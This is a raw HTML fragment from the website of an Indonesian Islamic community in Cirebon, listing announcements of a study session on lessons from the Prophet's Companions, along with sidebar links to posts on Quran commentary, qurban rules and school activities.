			<a aria-label="Pelajaran Dan Hikmah Dari Kisah Sahabat" href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat-2/" class="post-thumb"><img post-id="4883" fifu-featured="1" width="220" height="220" src="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=400&amp;q=80" class="attachment-jannah-image-large size-jannah-image-large wp-post-image" alt="Pelajaran Dan Hikmah Dari Kisah Sahabat" title="Pelajaran Dan Hikmah Dari Kisah Sahabat" title="Pelajaran Dan Hikmah Dari Kisah Sahabat" decoding="async" data-attachment-id="5269" data-permalink="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat-2//" data-orig-file="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=400&amp;q=80" data-orig-size="400,400" data-comments-opened="1" data-image-meta="[]" data-image-title="Pelajaran Dan Hikmah Dari Kisah Sahabat" data-image-description="" data-image-caption="" data-medium-file="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=400&amp;q=80" data-large-file="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=400&amp;q=80" /></a>
	<div class="post-details">

		<div class="post-meta clearfix"><span class="author-meta single-author no-avatars"><span class="meta-item meta-author-wrapper meta-author-1"><span class="meta-author"><a href="https://assunnahcirebon.com/author/penjaga-web/" class="author-name tie-icon" title="Admin">Admin</a></span></span></span><span class="date meta-item tie-icon">10 Januari 2022</span><div class="tie-alignright"><span class="meta-comment tie-icon meta-item fa-before">9</span><span class="meta-views meta-item "><span class="tie-icon-fire" aria-hidden="true"></span> 302 </span></div></div><!-- .post-meta -->
		<h2 class="post-title"><a href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat-2/">Pelajaran Dan Hikmah Dari Kisah Sahabat</a></h2>

						<p class="post-excerpt">Tema Kajian Pelajaran Dan Hikmah Dari Kisah Sahabat Pemateri Ustadz Fariq Gasim Anuz Tempat Kajian Masjid Asyafi’ie Bayasut Alamat Jl.&hellip;</p>
				<a class="more-link button" href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat-2/">Read More &raquo;</a>	</div>
</li>

<li class="post-item  post-4863 post type-post status-publish format-standard has-post-thumbnail category-cirebon-timur category-jadwal-kajian category-jumat category-masjid-al-mujahidin category-umum category-ustadz-fariq-gazim-anuz tie-standard">

	
			<a aria-label="Pelajaran dan Hikmah dari Kisah Sahabat" href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat/" class="post-thumb"><img post-id="4863" fifu-featured="1" width="330" height="220" src="https://images.unsplash.com/photo-1639901375872-9e7218d6c64d?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=871&amp;q=80" class="attachment-jannah-image-large size-jannah-image-large wp-post-image" alt="Pelajaran dan Hikmah dari Kisah Sahabat" title="Pelajaran dan Hikmah dari Kisah Sahabat" title="Pelajaran dan Hikmah dari Kisah Sahabat" decoding="async" fetchpriority="high" data-attachment-id="5385" data-permalink="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat//" data-orig-file="https://images.unsplash.com/photo-1639901375872-9e7218d6c64d?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=871&amp;q=80" data-orig-size="871,581" data-comments-opened="1" data-image-meta="[]" data-image-title="Pelajaran dan Hikmah dari Kisah Sahabat" data-image-description="" data-image-caption="" data-medium-file="https://images.unsplash.com/photo-1639901375872-9e7218d6c64d?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=871&amp;q=80" data-large-file="https://images.unsplash.com/photo-1639901375872-9e7218d6c64d?ixlib=rb-1.2.1&amp;ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&amp;auto=format&amp;fit=crop&amp;w=871&amp;q=80" /></a>
	<div class="post-details">

		<div class="post-meta clearfix"><span class="author-meta single-author no-avatars"><span class="meta-item meta-author-wrapper meta-author-1"><span class="meta-author"><a href="https://assunnahcirebon.com/author/penjaga-web/" class="author-name tie-icon" title="Admin">Admin</a></span></span></span><span class="date meta-item tie-icon">10 Januari 2022</span><div class="tie-alignright"><span class="meta-comment tie-icon meta-item fa-before">9</span><span class="meta-views meta-item "><span class="tie-icon-fire" aria-hidden="true"></span> 243 </span></div></div><!-- .post-meta -->
		<h2 class="post-title"><a href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat/">Pelajaran dan Hikmah dari Kisah Sahabat</a></h2>

						<p class="post-excerpt">Tema Kajian Pelajaran dan Hikmah dari Kisah Sahabat Pemateri Ustadz Fariq Gasim Anuz Tempat Kajian Masjid Mujahiddin Alamat Ciledug Tengah,&hellip;</p>
				<a class="more-link button" href="https://assunnahcirebon.com/2022/01/10/pelajaran-dan-hikmah-dari-kisah-sahabat/">Read More &raquo;</a>	</div>
</li>

					</ul><!-- #posts-container /-->
					<div class="clearfix"></div>
				</div><!-- .mag-box-container /-->
			</div><!-- .container-wrapper /-->
		</div><!-- .mag-box /-->
	
	</div><!-- .main-content /-->


	<aside class="sidebar tie-col-md-4 tie-col-xs-12 normal-side is-sticky" aria-label="Primary Sidebar">
		<div class="theiaStickySidebar">
			<link rel='stylesheet' id='tie-css-widgets-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/widgets.min.css' type='text/css' media='all' />
<script>console.log('Style tie-css-widgets')</script>
<div id="social-statistics-1" class="container-wrapper widget social-statistics-widget"><div class="widget-title the-global-title"><div class="the-subtitle">Ikuti Kami</div></div>			<ul class="solid-social-icons fullwidth-stats-icons white-bg Arqam">
				
							<li class="social-icons-item">
								<a class="facebook-social-icon" href="http://www.facebook.com/assunnahcirebonofficial" rel="nofollow noopener" target="_blank">
									<span class="counter-icon arqicon-facebook"></span>									<span class="followers">
										<span class="followers-num">5569</span>
										<span class="followers-name">FansPage</span>
									</span>
								</a>
							</li>
							
							<li class="social-icons-item">
								<a class="youtube-social-icon" href="http://youtube.com/channel/UCZs2BXIcK3m_JS1DYW7M3gw" rel="nofollow noopener" target="_blank">
									<span class="counter-icon arqicon-youtube"></span>									<span class="followers">
										<span class="followers-num">7280</span>
										<span class="followers-name">Subscribers</span>
									</span>
								</a>
							</li>
										</ul>
			<div class="clearfix"></div></div><!-- .widget /--><div id="stream-item-widget-9" class="widget stream-item-widget widget-content-only"><div class="stream-item-widget-content"><img class="widget-ad-image" src="https://assunnahcirebon.com/wp-content/uploads/2024/06/WhatsApp-Image-2024-06-22-at-10.07.00-scaled.jpeg" width="336" height="280" alt=""></div></div>
			<div class="container-wrapper tabs-container-wrapper tabs-container-4">
				<div class="widget tabs-widget">
					<div class="widget-container">
						<div class="tabs-widget">
							<div class="tabs-wrapper">

								<ul class="tabs">
									<li><a href="#widget_tabs-1-popular"><span class="tie-icon-eye"></span></a></li><li><a href="#widget_tabs-1-recent"><span class="tie-icon-file-text"></span></a></li><li><a href="#widget_tabs-1-comments"><span class="tie-icon-comments"></span></a></li>								</ul><!-- ul.tabs-menu /-->

								
											<div id="widget_tabs-1-popular" class="tab-content tab-content-popular">
												<ul class="tab-content-elements">
													
<li class="widget-single-post-item widget-post-list">

			<div class="post-widget-thumbnail">

			
			<a aria-label="فقه الأضحية (Fikih Tentang Qurban)" href="https://assunnahcirebon.com/2021/07/08/%d9%81%d9%82%d9%87-%d8%a7%d9%84%d8%a3%d8%b6%d8%ad%d9%8a%d8%a9/" class="post-thumb"><img width="150" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah.jpg 2084w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-300x300.jpg 300w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-1024x1024.jpg 1024w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-150x150.jpg 150w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-768x768.jpg 768w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-1536x1536.jpg 1536w, https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-2048x2048.jpg 2048w" sizes="auto, (max-width: 150px) 100vw, 150px" data-attachment-id="4615" data-permalink="https://assunnahcirebon.com/2021/07/08/%d9%81%d9%82%d9%87-%d8%a7%d9%84%d8%a3%d8%b6%d8%ad%d9%8a%d8%a9/udhiyah/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah.jpg" data-orig-size="2084,2084" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;Triops&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600250359&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="udhiyah" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-300x300.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2021/07/udhiyah-1024x1024.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2021/07/08/%d9%81%d9%82%d9%87-%d8%a7%d9%84%d8%a3%d8%b6%d8%ad%d9%8a%d8%a9/">فقه الأضحية (Fikih Tentang Qurban)</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">8 Juli 2021</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Pemuda Di Hari Ini Adalah Pemimpin Di Masa Depan" href="https://assunnahcirebon.com/2022/03/14/pemuda-di-hari-ini-adalah-pemimpin-di-masa-depan/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2022/03/image_2022-03-14_093833-220x150.png" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="5471" data-permalink="https://assunnahcirebon.com/2022/03/14/pemuda-di-hari-ini-adalah-pemimpin-di-masa-depan/image_2022-03-14_093833/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2022/03/image_2022-03-14_093833.png" data-orig-size="873,478" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image_2022-03-14_093833" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2022/03/image_2022-03-14_093833-300x164.png" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2022/03/image_2022-03-14_093833.png" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2022/03/14/pemuda-di-hari-ini-adalah-pemimpin-di-masa-depan/">Pemuda Di Hari Ini Adalah Pemimpin Di Masa Depan</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">14 Maret 2022</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Tafsir Surat Al-Ma&#8217;aarij {Bagian 2}" href="https://assunnahcirebon.com/2020/03/17/tafsir-surat-al-maaarij-bagian-2/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2020/06/065.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://assunnahcirebon.com/wp-content/uploads/2020/06/065.jpg 800w, https://assunnahcirebon.com/wp-content/uploads/2020/06/065-300x203.jpg 300w, https://assunnahcirebon.com/wp-content/uploads/2020/06/065-768x519.jpg 768w, https://assunnahcirebon.com/wp-content/uploads/2020/06/065-130x90.jpg 130w" sizes="auto, (max-width: 220px) 100vw, 220px" data-attachment-id="3073" data-permalink="https://assunnahcirebon.com/2020/03/17/tafsir-surat-al-maaarij-bagian-1/attachment/065/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/065.jpg" data-orig-size="800,541" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="065" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/065-300x203.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/065.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2020/03/17/tafsir-surat-al-maaarij-bagian-2/">Tafsir Surat Al-Ma&#8217;aarij {Bagian 2}</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">17 Maret 2020</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Tafsir Surat Al-Balad" href="https://assunnahcirebon.com/2020/02/26/tafsir-surat-al-balad/" class="post-thumb"><img width="220" height="124" src="https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad.jpg 801w, https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad-300x169.jpg 300w, https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad-768x433.jpg 768w" sizes="auto, (max-width: 220px) 100vw, 220px" data-attachment-id="2870" data-permalink="https://assunnahcirebon.com/2020/02/26/tafsir-surat-al-balad/tafsir-surat-al-balad/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad.jpg" data-orig-size="801,452" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;Forum Ummahat&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1591692357&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Tafsir Surat Al-Balad" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad-300x169.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2020/06/Tafsir-Surat-Al-Balad.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2020/02/26/tafsir-surat-al-balad/">Tafsir Surat Al-Balad</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">26 Februari 2020</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Tafsir Surat Al-Hasyr (Bagian 1)" href="https://assunnahcirebon.com/2020/03/28/tafsir-surat-al-hasyr-bagian-1/" class="post-thumb"><img width="220" height="124" src="https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy.jpg 800w, https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy-300x170.jpg 300w, https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy-768x434.jpg 768w" sizes="auto, (max-width: 220px) 100vw, 220px" data-attachment-id="2730" data-permalink="https://assunnahcirebon.com/2020/02/10/tafsir-surat-quraisy/tafsir-surat-quraisy/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy.jpg" data-orig-size="800,452" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;bdakw&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1581412431&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Tafsir Surat Quraisy" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy-300x170.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2020/05/Tafsir-Surat-Quraisy.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2020/03/28/tafsir-surat-al-hasyr-bagian-1/">Tafsir Surat Al-Hasyr (Bagian 1)</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">28 Maret 2020</span>		</div>
	</div>
</li>
												</ul>
											</div><!-- .tab-content#popular-posts-tab /-->

										
											<div id="widget_tabs-1-recent" class="tab-content tab-content-recent">
												<ul class="tab-content-elements">
													
<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Agar Istiqomah Dalam Beribadah" href="https://assunnahcirebon.com/2025/05/27/agar-istiqomah-dalam-beribadah/" class="post-thumb"><img post-id="6992" fifu-featured="1" width="220" height="66" src="https://assunnahcirebon.com/wp-content/uploads/2025/05/Black-Minimalist-Linkedin-Banner-scaled.png" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="Agar Istiqomah Dalam Beribadah" title="Agar Istiqomah Dalam Beribadah" title="Agar Istiqomah Dalam Beribadah" decoding="async" loading="lazy" data-attachment-id="6998" data-permalink="https://assunnahcirebon.com/2025/05/27/agar-istiqomah-dalam-beribadah//" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/Black-Minimalist-Linkedin-Banner-scaled.png" data-orig-size="2560,768" data-comments-opened="1" data-image-meta="[]" data-image-title="Agar Istiqomah Dalam Beribadah" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/Black-Minimalist-Linkedin-Banner-scaled.png" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/Black-Minimalist-Linkedin-Banner-scaled.png" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2025/05/27/agar-istiqomah-dalam-beribadah/">Agar Istiqomah Dalam Beribadah</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">7 jam ago</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Pelepasan Santri dan Santriwati MA Assunnah Cirebon" href="https://assunnahcirebon.com/2025/05/19/pelepasan-santri-dan-santriwati-ma-assunnah-cirebon/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2025/05/WhatsApp-Image-2025-05-17-at-11.32.39-2-220x150.jpeg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="6985" data-permalink="https://assunnahcirebon.com/2025/05/19/pelepasan-santri-dan-santriwati-ma-assunnah-cirebon/whatsapp-image-2025-05-17-at-11-32-39-2/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/WhatsApp-Image-2025-05-17-at-11.32.39-2-scaled.jpeg" data-orig-size="2560,1702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WhatsApp Image 2025-05-17 at 11.32.39 (2)" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/WhatsApp-Image-2025-05-17-at-11.32.39-2-300x199.jpeg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/WhatsApp-Image-2025-05-17-at-11.32.39-2-1024x681.jpeg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2025/05/19/pelepasan-santri-dan-santriwati-ma-assunnah-cirebon/">Pelepasan Santri dan Santriwati MA Assunnah Cirebon</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">1 minggu ago</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Catatan Tabligh Akbar Ustadz DR Syafiq Basalamah, Lc, MA" href="https://assunnahcirebon.com/2025/05/05/catatan-tabligh-akbar-ustadz-dr-syafiq-basalamah-lc-ma/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2025/05/495445362_1149123080558745_1118263459084013562_n-e1746406827346-220x150.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="6978" data-permalink="https://assunnahcirebon.com/2025/05/05/catatan-tabligh-akbar-ustadz-dr-syafiq-basalamah-lc-ma/495445362_1149123080558745_1118263459084013562_n/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/495445362_1149123080558745_1118263459084013562_n-e1746406827346.jpg" data-orig-size="768,637" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="495445362_1149123080558745_1118263459084013562_n" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/495445362_1149123080558745_1118263459084013562_n-e1746406827346-300x249.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2025/05/495445362_1149123080558745_1118263459084013562_n-e1746406827346.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2025/05/05/catatan-tabligh-akbar-ustadz-dr-syafiq-basalamah-lc-ma/">Catatan Tabligh Akbar Ustadz DR Syafiq Basalamah, Lc, MA</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">3 minggu ago</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Keceriaan Anak-anak TKIT dan SDIT Assunnah Bersama Kak Erlan Iskandar" href="https://assunnahcirebon.com/2025/04/28/keceriaan-anak-anak-tkit-dan-sdit-assunnah-bersama-kak-erlan-iskandar/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2025/04/492808662_1145057107632009_9079361536624303264_n-1-220x150.jpg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="6971" data-permalink="https://assunnahcirebon.com/2025/04/28/keceriaan-anak-anak-tkit-dan-sdit-assunnah-bersama-kak-erlan-iskandar/492808662_1145057107632009_9079361536624303264_n-1/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/492808662_1145057107632009_9079361536624303264_n-1.jpg" data-orig-size="1600,914" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="492808662_1145057107632009_9079361536624303264_n (1)" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/492808662_1145057107632009_9079361536624303264_n-1-300x171.jpg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/492808662_1145057107632009_9079361536624303264_n-1-1024x585.jpg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2025/04/28/keceriaan-anak-anak-tkit-dan-sdit-assunnah-bersama-kak-erlan-iskandar/">Keceriaan Anak-anak TKIT dan SDIT Assunnah Bersama Kak Erlan Iskandar</a>

		<div class="post-meta">
			<span class="date meta-item tie-icon">4 minggu ago</span>		</div>
	</div>
</li>

<li class="widget-single-post-item widget-post-list tie-standard">

			<div class="post-widget-thumbnail">

			
			<a aria-label="Belajar Jadi Pedagang Cilik yang Jujur dan Kreatif di Market Day" href="https://assunnahcirebon.com/2025/04/28/belajar-jadi-pedagang-cilik-yang-jujur-dan-kreatif-di-market-day/" class="post-thumb"><img width="220" height="150" src="https://assunnahcirebon.com/wp-content/uploads/2025/04/WhatsApp-Image-2025-04-25-at-09.03.01-220x150.jpeg" class="attachment-jannah-image-small size-jannah-image-small tie-small-image wp-post-image" alt="" decoding="async" loading="lazy" data-attachment-id="6965" data-permalink="https://assunnahcirebon.com/2025/04/28/belajar-jadi-pedagang-cilik-yang-jujur-dan-kreatif-di-market-day/whatsapp-image-2025-04-25-at-09-03-01/" data-orig-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/WhatsApp-Image-2025-04-25-at-09.03.01-scaled.jpeg" data-orig-size="2560,1920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WhatsApp Image 2025-04-25 at 09.03.01" data-image-description="" data-image-caption="" data-medium-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/WhatsApp-Image-2025-04-25-at-09.03.01-300x225.jpeg" data-large-file="https://assunnahcirebon.com/wp-content/uploads/2025/04/WhatsApp-Image-2025-04-25-at-09.03.01-1024x768.jpeg" /></a>		</div><!-- post-alignleft /-->
	
	<div class="post-widget-body ">
		<a class="post-title the-subtitle" href="https://assunnahcirebon.com/2025/04/28/belajar-jadi-pedagang-cilik-yang-jujur-dan-kreatif-di-market-day/">Belajar Jadi Pedagang Cilik yang Jujur dan Kreatif di Market Day</a>

